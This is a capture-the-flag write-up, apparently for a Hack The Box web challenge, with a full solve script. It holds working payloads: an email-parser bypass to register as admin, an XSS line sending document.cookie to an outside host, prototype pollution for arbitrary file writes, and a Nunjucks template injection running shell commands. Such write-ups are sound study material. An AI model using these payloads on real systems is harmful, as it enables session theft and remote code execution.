---
ai_date: 2025-04-27 05:17:17
ai_summary: Bypassed email domain validation and used prototype pollution and template injection to gain admin access and retrieve flag
ai_tags:
  - xss
  - prototype-pollution
  - template-injection
created: 2024-12-13T17:55
points: 975
tags:
  - fav
  - email
  - 0day
updated: 2025-07-14T09:46
---

This appears similar to Armaxis, except I finally get to send email to multiple recipients?

## probe

The first step is to register, however we only have the email address `test@email.htb`, while registration requires `@interstellar.htb`.

```js [challenge/controllers/authController.js]
const emailDomain = emailAddresses.parseOneAddress(email)?.domain;

if (!emailDomain || emailDomain !== 'interstellar.htb') {
	return res.status(200).json({ message: 'Registration is not allowed for this email domain', emailDomain });
}
```

After which there is a verification step, where the exact same email used (it has to be the same email character by character) is passed into `nodemailer` to send a verification code.

```js [challenge/util.js]
const sendVerificationEmail = async (email, code) => {
  const mailOptions = {
    from: "no-reply@interstellar.htb",
    to: email,
    subject: "Email Verification",
    html: `Your verification code is: ${code}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log(`Verification email sent to ${email}`);
  } catch (error) {
    console.error("Error sending email:", error);
    throw new Error("Unable to send verification email");
  }
};
```

To make it send to multiple people I have to.. register with a comma?

```js [nodemailer]
/** Comma separated list or an array of recipients e-mail addresses that will appear on the To: field */
to?: string | Address | Array<string | Address> | undefined;
```

But how? `email-addresses` will reject all invalid emails at the registration step.

### sequelize (useless)

I looked up `sequelize`'s docs and found operators.

```js [docs]
Post.findAll({
  where: {
    authorId: { [Op.isNot]: null },
  },
});
```

But they are symbols and doesn't survive `JSON.stringify`.

## email polyglot

The goal is to produce two different email address when using the two different libraries.

So I read through the source code of `nodemailer` and `email-addresses`.

I found the control characters from the source files of `nodemailer`. [nodemailer/lib/addressparser/index.js at master · nodemailer/nodemailer](https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js)

Source code of `email-addresses` was a bit hard to read but ig since it also supported the `"name" <email@domain.net>` syntax, the control characters might be of use.

> I actually tried manually fuzzing for quite a while but eventually gave up.

```js [email-fuzzer.js]
const emailAddresses = require('email-addresses');
const addressparser = require('nodemailer/lib/addressparser');

const controlChars = [';', ':', '\'', '"', ',', '(', ')', '<', '>', '\\', '/', '[', ']', '{', '}', '@'];
function injectControlChars(baseString) {
    const chars = baseString.split('');
    const positions = Math.floor(Math.random() * baseString.length);
    for (let i = 0; i < positions; i++) {
        const randomPos = Math.floor(Math.random() * (chars.length + 1));
        const randomChar = controlChars[Math.floor(Math.random() * controlChars.length)];
        chars.splice(randomPos, 0, randomChar);
    }

    return chars.join('');
}
const baseEmail = '"test@email.htb" <dummy@interstellar.htb>';

let iterations = 0;
while (true) {
    iterations++;
    const fuzzedEmail = injectControlChars(baseEmail);

    try {
        const d1 = emailAddresses.parseOneAddress(fuzzedEmail)?.domain;
        const d2 = addressparser(fuzzedEmail);
        if (!d1) continue;
        if (!d2.length) continue;
        if (d1 === "interstellar.htb" && d2.some((x) => !x.address.endsWith("@interstellar.htb"))) {
            console.log("possible", fuzzedEmail, d1, d2.map((x) => x.address));
        }

        if (d1 === "interstellar.htb" && d2.some((x) => x.address === "test@email.htb")) {
            console.log(`Mismatch found after ${iterations} iterations!`);
            console.log(`Fuzzed Email: ${fuzzedEmail}`);
            console.log(`email-addresses output: ${d1}`);
            console.log(`nodemailer output: ${JSON.stringify(d2)}`);
            break;
        }
    } catch (error) {
        console.error(`Error processing email: ${fuzzedEmail}`, error);
    }
}
```

### email payload
After a while I got this.

```
<("test>@email.ht\b" {:<du'>mm)y@interstellar.htb> interstellar.htb [ '("test' ]
```

Which looks promising because `email-addresses` thinks it has `interstellar.htb` domain, while `nodemailer` gives a totally different address!

Let's build on it a little bit more and simplify the payload.

```
<(<test@email.htb>)y@interstellar.htb>
```

This is a rather interesting payload!

```python [solve.py]
email = f"u{random.randint(100, 1000)}@interstellar.htb"
email = f'<(<test@email.htb>)y{random.randint(100, 1000)}@interstellar.htb>'
print(requests.post(target + "/api/register", json={
    "email": email,
    "password": "password",
    "role": "admin"
}).text)
requests.get(f"{emailt}/deleteall")
print(requests.post(f"{target}/api/sendEmail", json={"email": email}).text)
sleep(0.5)
code = re.findall(r"Your verification code is: ([a-f0-9]+)", requests.get(emailt).text)[0]
print("code", code)
print(requests.post(f"{target}/api/verify", json={"email": email, "code": code}).text)
token = requests.post(f"{target}/api/login", json={"email": email, "password": "password"}).json()['token']
```

```json
{"message":"User registered. Verification email sent.","status":201}
{"message":"New verification code sent","status":200}
{"message":"Account verified successfully","status":200}
```

Yay, we can now simply register ourselves as an admin and login.
## xss (useless)

Since we have a `bot.js` I believe this has something to do with XSS.

The first attack vector I found was this, `innerHTML`.

```js [challenge/views/showBounty.html]
document.getElementById("description").innerHTML =
	bounty.description ||
	"<p>No details available for this bounty.</p>";
```

```python [solve.py]
print(s.put(f"{target}/api/bounties/{b['id']}", json={
    "description": "<img src=1 onerror='location.href=\"https://1337.yun.ng/?\"+document.cookie'/>"
}).text)
stop, wait = webhook(1337)
print(s.get(f"{target}/api/report/{b['id']}").text)
data = wait()
stop()
admin_token = data['auth']
```

...and it worked.

But I already have a admin token, so what's the point?

Maybe I had an unintended solution?
## prototype pollution

Spent a lot of time trying to read the file `/flag.txt` somehow, I've tried redirects to `file:///flag.txt` but non worked. `needle` itself seems uncapable of reading local files, so even if an redirect worked needle won't give me any flags.

While looking around I found that the `mergedeep` function is again, susceptible to prototype pollution.

The payload is simple. `{"__proto__": {"polluted": "vulnerable"}}`.

However after I pollute the prototype server will stop functioning (unable to run previous steps of register + login etc).

Then, I realized this option in `needle`.

> `output` : Dump response output to file

...that means arbitrary file writes!

### payload

```python [solve.py]
print(s.put(f"{target}/api/bounties/{b['id']}", json={
    "__proto__": {"output": "/app/views/index.html"},
    "description": "hello"
}).text)
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1734153476/2024/12/c34d463bb6907cefc1b12f9013950411.png)

And it worked!

Now I just need template injection!

## template injection

Simple payload from HackTricks: [SSTI (Server Side Template Injection) | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks)

```html
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}}
```

## activation

Now, to activate the payload, we simply visit the target page directly, `index.html` has been overwritten, which means we will now see the flag.
## solve script

The last step of prototype pollution + template injection took me so long to find, was on the edge of giving up.

In the end it was worth it, loved the challenge.

```python
import re
import random
from time import sleep
import requests

from server import serve_file, webhook

target = "http://94.237.55.109:44276"
emailt = "http://94.237.55.109:59902"

# register, verify, login as admin using email bypass
email = f"u{random.randint(100, 1000)}@interstellar.htb"
email = f'<(<test@email.htb>)y{random.randint(100, 1000)}@interstellar.htb>'
print(requests.post(target + "/api/register", json={
    "email": email,
    "password": "password",
    "role": "admin"
}).text)
requests.get(f"{emailt}/deleteall")
print(requests.post(f"{target}/api/sendEmail", json={"email": email}).text)
sleep(0.5)
code = re.findall(r"Your verification code is: ([a-f0-9]+)", requests.get(emailt).text)[0]
print(requests.post(f"{target}/api/verify", json={"email": email, "code": code}).text)
token = requests.post(f"{target}/api/login", json={"email": email, "password": "password"}).json()['token']
print("token", token)
s = requests.Session()
s.cookies.set("auth", token)

# useless xss
b = s.post(f"{target}/api/bounties", json={"status": "approved", "target_name": "test", "description": "hello"}).json()['data']
print(s.put(f"{target}/api/bounties/{b['id']}", json={
    "description": "<img src=1 onerror='location.href=\"https://1337.yun.ng/?\"+document.cookie'/>"
}).text)
stop, wait = webhook(1337)
print(s.get(f"{target}/api/report/{b['id']}").text)
data = wait()
stop()
admin_token = data['auth']
print("admin_token", admin_token)

# prototype pollution
print(s.put(f"{target}/api/bounties/{b['id']}", json={
    "__proto__": {"output": "/app/views/index.html"},
    "description": "hello"
}).text)
# template injection payload
payload = """
<h1>hello</h1>
{{7*7}}
<br>
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}}
"""
stop = serve_file(payload.encode(), 1337, "text/html")
print(s.post(f"{target}/api/transmit", json={"url": f"https://1337.yun.ng"}).text)
stop()
print()
print(s.get(target).text)
```

```flag
HTB{f1nd1ng_0d4y_15_345Y_r1gh7!!?_0ebb1f7993d6e89e4c315e745aeb6483}
```